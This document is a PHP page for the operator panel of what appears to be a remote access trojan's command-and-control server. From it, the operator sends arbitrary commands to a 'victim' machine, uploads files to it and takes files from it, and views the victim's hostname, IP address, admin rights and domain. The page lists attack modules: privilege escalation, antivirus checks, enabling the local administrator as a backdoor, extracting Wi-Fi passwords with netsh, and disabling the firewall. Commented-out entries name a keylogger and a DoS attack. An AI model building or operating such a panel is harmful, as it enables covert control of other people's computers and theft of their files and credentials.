<?php
require_once("conn.php");
require_once('header.php');

if ($_SESSION['userId'] ==  1) {

    $user_id = isset($_GET['user_identifier']) ?  $_GET['user_identifier'] : null;
?>
    <link rel="stylesheet" href="style/style.css">

    <div class="container bg-light">
        <div>
            <div class="row">
                <div class="col-2"></div>
                <div class="col-1">
                <a class="btn btn-primary mt-3 justify-content-center" href="log?user_identifier=<?=htmlspecialchars($user_id)?>" role="button">Victim Logs</a>
                    <button class="btn btn-success mt-1 justify-content-center" type="submit" form="form_command"  name="send_command" value="Send!" >Sleep victim</button>
                    <input type="hidden" name="sleep_command" value="sleep" form="form_command">
                </div>
                <div class="col-1"></div>
                <div class="col-4 mt-2">
                    <form action="actions" method="post" autocomplete="off" id="form_command">
                        <input type="text" name="pkoda" class="form-control" placeholder="Enter a command">
                        <input type="hidden" name="user_identifier" value="<?= $user_id ?>">
                        <input type="hidden" name="token" value="<?= $token ?>">
                        <div class="d-grid gap-2 mt-2">
                            <input type="submit" name="send_command" value="Send!" class="formbtn btn btn-success">
                        </div>
                    </form>
                </div>
                <div class="col-1">
                  
                </div>
                <div class="col-2">
                    <form action="actions.php" method="post" enctype="multipart/form-data" class="pt-2">
                        <input type="hidden" name="user_identifier" value="<?= $user_id ?>">
                        <label for="file-upload" class="border rounded border-1 bg-white p-2">
                            <i class="fa fa-cloud-upload"></i> Upload file to victim
                        </label><br>
                        <input type="hidden" name="token" value="<?= $token ?>">
                        <input id="file-upload" type="file" class="d-none" name="file-upload">
                        <input type="submit" class=" btn btn-info" name="upload_file">
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-3">
        <div class="row">
            <div class="col-4">
                <div class="p-2 border border-dark rounded">
                    <label for="resultTextarea">Output:</label>
                    <textarea class="form-control result" id="resultTextarea" rows="20" readonly></textarea>
                </div>
            </div>
            <div class="col-4">
                <div class="p-2 border border-dark rounded" style="min-height:100%;">
                    <b>option: </b> <span class="float-end small">(Click at the name for details)</span>
                    <ol class="ol-attack">
                        <!--                         <li class="attack-list">Upload:
                            <ul class="explain-attack">
                                <li>
                                    upload file to victim machine..
                                    Usage: upload [file]</li>
                            </ul>
                        </li> -->
                        <li class="attack-list">take file:
                            <ul class="explain-attack">
                                <li>
                                    take file from victim machine..<br>
                                    Usage: download [file]</li>
                            </ul>
                        </li>
<!--                         <li class="attack-list">keylogger:</li>
                        <li class="attack-list">Extra Info
                            <ul class="explain-attack">
                                <li>
                                    gather more data about the victim..
                                    (loc, city, MS updates, Domain)
                                    Usage: info </li>
                            </ul>
                        </li>
                        <li class="attack-list">Dos attack</li>
                        <ul class="explain-attack">
                            <li>
                                flag techniques:

                                Usage: dos [https:example.com]
                            </li>
                        </ul>
                        </li> -->
                    </ol>
                    <b>Windows: </b>
                    <ol class="ol-attack">
                        <li class="attack-list" style="font-size: medium;">Privilege Escalation Unquoted Service:
                            <ul class="explain-attack">
                                <li>
                                    Check if exsist "Unquoted Service" to creata a privilage escalation..<br>
                                    Usage: priv-unquoted </li>
                            </ul>
                        </li>
                        <li class="attack-list">Anti-Virus Checker:
                            <ul class="explain-attack">
                                <li>
                                    Check which AV are installed And if active..<br>
                                    Usage: AV </li>
                            </ul>
                        </li>

                        <li class="attack-list">Active Local administrator
                            <ul class="explain-attack">
                                <li>
                                    by default local admin has no password,
                                    it's could be a "Backdoor"<br>
                                    Usage: adm-act </li>
                            </ul>
                        </li>
                        <li class="attack-list">Extract Wifi Password
                            <ul class="explain-attack">
                                <li>
                                    Usage for list: netsh wlan show profile<br>
                                    Usage for Extract: netsh wlan show profile "hostname" key=clear </li>
                            </ul>
                        </li>
                        <li class="attack-list">Disabled Local FireWall</li>
                        <ul class="explain-attack">
                            <li>
                                important - this action require admin prev.
                                ** it's make alert!
                                Usage: fireoff
                            </li>
                        </ul>
                        </li>
                    </ol>
                    <b>Linux: </b>
                    <ol class="ol-attack">
                        
                    </ol>
                </div>
            </div>
            <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
            <script>
                $('.attack-list').click(function(e) {
                    e.preventDefault();
                    $(this).closest("li").find("[class^='explain-attack']").slideToggle();
                });
            </script>
            <div class="col-4">
                <div class="p-2 border border-dark rounded" style="min-height:100%;">
                    <b>User Info:</b><br>
                    <?php
                    $sql = "SELECT * FROM victims WHERE user_identifier = ?;";
                    $stmt = mysqli_stmt_init($db);
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL statement failed!";
                    } else {
                        mysqli_stmt_bind_param($stmt, "i", $user_id);
                        mysqli_stmt_execute($stmt);
                        $result = mysqli_stmt_get_result($stmt);

                        while ($row = mysqli_fetch_assoc($result)) {
                            echo '
        
                    <table class="table table-borderless">
                        <tbody>
                            <tr>
                                <th class="py-1">Num</th>
                                <td class="py-1">' . htmlspecialchars($row["id"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">User Identifier: </th>
                                <td class="py-1">' . htmlspecialchars($row["user_identifier"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Executable dir: </th>
                                <td class="py-1">' . htmlspecialchars($row["dir_location"]) . '</td>
                            </tr>
                            <tr>
                                <th >Hostname</th>
                                <td class="py-1">' . htmlspecialchars($row["HostName"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">IP</th>
                                <td class="py-1">' . htmlspecialchars($row["IP"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Is active</th>
                                <td class="py-1">' . htmlspecialchars($row["Active"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Last Report</th>
                                <td class="py-1">' . htmlspecialchars($row["Last_Report"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">OS</th>
                                <td class="py-1">' . htmlspecialchars($row["OS"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">UserName</th>
                                <td class="py-1">' . htmlspecialchars($row["UserName"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">TimeZone</th>
                                <td class="py-1">' . htmlspecialchars($row["timezone"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">UAC</th>
                                <td class="py-1"> ' . htmlspecialchars($row["uac"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Is Admin?</th>
                                <td class="py-1"> ' . htmlspecialchars($row["isadmin"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Domain</th>
                                <td class="py-1"> ' . htmlspecialchars($row["domain"]) . '</td>
                            </tr>
                            <tr>
                                <th class="py-1">Note:</th>
                                <td class="py-1"> ' . htmlspecialchars($row["comments"]) . '</td>
                            </tr>

                        </tbody>
                    </table>
                    ';
                        }
                    } ?>
                </div>
            </div>
        </div>
    </div>
    </div>
    </body>

    </html>

    <script>
        function refresh_div() {
            jQuery.ajax({
                url: 'actions.php?varname=<?php echo htmlspecialchars($user_id) ?>',
                data: {
                    "refresh_user_output": "refresh_user_output"
                },
                type: 'POST',
                success: function(results) {
                    jQuery(".result").html(results.replace(/br/gi, " ").replace(/>|</gi, " ").replace(/\//g, ""));
                }
            });
        }

        t = setInterval(refresh_div, 1500);
    </script>
<?php
} else {
    http_response_code(404);
}
?>